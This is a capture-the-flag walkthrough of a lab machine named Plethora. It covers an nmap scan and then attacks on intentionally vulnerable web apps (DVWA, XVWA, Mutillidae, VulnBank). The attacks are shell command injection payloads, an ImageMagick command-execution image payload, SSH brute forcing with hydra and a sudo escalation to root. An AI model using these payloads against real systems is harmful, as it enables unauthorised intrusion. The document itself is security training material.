# Plethora

echo machine-ip plethora >> /etc/hosts

###### Enumeration

```
# Nmap 7.80 scan initiated Sun Jun 14 06:19:39 2020 as: nmap -sC -sV -oN nmap.txt plethora
Nmap scan report for plethora (10.10.191.114)
Host is up (0.30s latency).
Not shown: 982 closed ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          ProFTPD 1.3.5
22/tcp    open  ssh          OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 89:ba:6f:21:da:f1:a3:ca:5c:91:98:9a:52:61:06:12 (DSA)
|   2048 61:c2:7a:48:a6:1f:38:14:7a:b0:8c:1c:f5:0f:20:73 (RSA)
|   256 18:9e:f8:6b:e4:31:32:91:49:a0:88:08:50:a5:51:43 (ECDSA)
|_  256 a5:5a:3f:89:f2:2d:2c:72:46:ab:79:01:a2:b4:e0:70 (ED25519)
23/tcp    open  telnet       Linux telnetd
25/tcp    open  smtp         Postfix smtpd
|_smtp-commands: plethora, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
|_ssl-date: TLS randomness does not represent time
53/tcp    open  domain       ISC BIND 9.9.5-3ubuntu0.19 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.19-Ubuntu
80/tcp    open  http         Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: plethora
110/tcp   open  pop3         Dovecot pop3d
|_pop3-capabilities: PIPELINING CAPA UIDL AUTH-RESP-CODE SASL(PLAIN) STLS USER TOP RESP-CODES
111/tcp   open  rpcbind      2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      46464/tcp   mountd
|   100005  1,2,3      48125/udp6  mountd
|   100005  1,2,3      52904/udp   mountd
|   100005  1,2,3      59700/tcp6  mountd
|   100021  1,3,4      40501/udp6  nlockmgr
|   100021  1,3,4      41102/tcp6  nlockmgr
|   100021  1,3,4      42548/tcp   nlockmgr
|   100021  1,3,4      56901/udp   nlockmgr
|   100024  1          38032/udp6  status
|   100024  1          40656/tcp6  status
|   100024  1          42408/udp   status
|   100024  1          54636/tcp   status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open  imap         Dovecot imapd
|_imap-capabilities: STARTTLS have Pre-login IMAP4rev1 OK post-login AUTH=PLAINA0001 listed capabilities more ENABLE LOGIN-REFERRALS SASL-IR ID LITERAL+ IDLE
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds Samba smbd 4.3.11-Ubuntu
993/tcp   open  ssl/imaps?
995/tcp   open  ssl/pop3s?
2049/tcp  open  nfs_acl      2-3 (RPC #100227)
3306/tcp  open  mysql        MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: 38
|   Capabilities flags: 63487
|   Some Capabilities: SupportsCompression, LongPassword, Speaks41ProtocolNew, ConnectWithDatabase, Support41Auth, LongColumnFlag, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, DontAllowDatabaseTableColumn, InteractiveClient, SupportsLoadDataLocal, FoundRows, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 8$H#q3HN3R$Zxl9t\Q_k
|_  Auth Plugin Name: mysql_native_password
8080/tcp  open  http-proxy?
8093/tcp  open  ssl/unknown
10000/tcp open  http         MiniServ 1.920 (Webmin httpd)
Service Info: Host:  plethora; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m07s, deviation: 2h53m24s, median: 0s
|_nbstat: NetBIOS name: PLETHORA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: plethora
|   NetBIOS computer name: PLETHORA\x00
|   Domain name: \x00
|   FQDN: plethora
|_  System time: 2020-06-14T05:23:01-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-14T10:23:01
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 14 06:27:56 2020 -- 1 IP address (1 host up) scanned in 497.63 seconds
```
## DVWA flag.txt

```
firefox http://10.10.97.218:8090/login.php

username: admin
password: password
```

> 127.0.0.1; find / -name flag 2>/dev/null

```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.050 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.066 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.044 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.080 ms
--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.044/0.060/0.080/0.000 ms
/flag.txt
```

> 127.0.0.1; cat /flag.txt

```
<redacted>
```

## XVWA flag.txt
```firefox
http://10.10.97.218:8092/xvwa/vulnerabilities/cmdi/
```
> 127.0.0.1; find / -name flag.txt 2>/dev/null

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.058 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.037 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.032 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2000ms
rtt min/avg/max/mdev = 0.032/0.042/0.058/0.012 ms
/flag.txt
```
> 127.0.0.1; cat /flag.txt

```
<redacted>
```

## Multilade

```firefox
http://10.10.87.218:8093/index.php?page=dns-lookup.php
```

> 127.0.0.1; find / -name flag.txt 2>/dev/null

```
Server:		10.0.0.2
Address:	10.0.0.2#53

Non-authoritative answer:
1.0.0.127.in-addr.arpa	name = localhost.

Authoritative answers can be found from:

/flag.txt
```
> 127.0.0.1; cat /flag.txt

```
<redacted>
```

## VulnBank 
```firefox
http://plethora:8091/vulnbank/online/login.php
```
```creds
j.doe : password
```

The web is actually vulnerable to `Imagemagick arbitrary command execution`.
upload the payload.png to profile pic.

```payload.png
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/oppsie.jpg"|cat /flag.txt > hack.txt")'
pop graphic-context
```

> http://plethora:8091/vulnbank/online/hack.txt

```
<redacted>
```

# user flag

```enum4linux
 ============================= 
|    Users on 10.10.97.218    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: zayotic  Name:   Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: mason    Name:   Desc: 
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: root     Name: root   Desc: 
```

> hydra -l zyotic -P rockyou.txt ssh://plethora

> hydra -l mason -P mason ssh://plethora

```
creds found by brute forcing ssh using hydra

mason : 12345678
zayotic: password
```
```bash
find /home -name user.txt 2>/dev/null
```
```
cat user.txt
<redacted>
```


## root flag

###### Privilege Escalation

```
bash as user zayotic
sudo bash
```

```
cat root.txt
<redacted>
```

## OWASP Juice shop

i cheated on this one, i wasnt able to get the flag by intended way

> docker exec -u 0 -it f32e58f2b87a find / -name flag.txt

```
docker exec -u 0 -it f32e58f2b87a cat /home/juicer/flag.txt
```
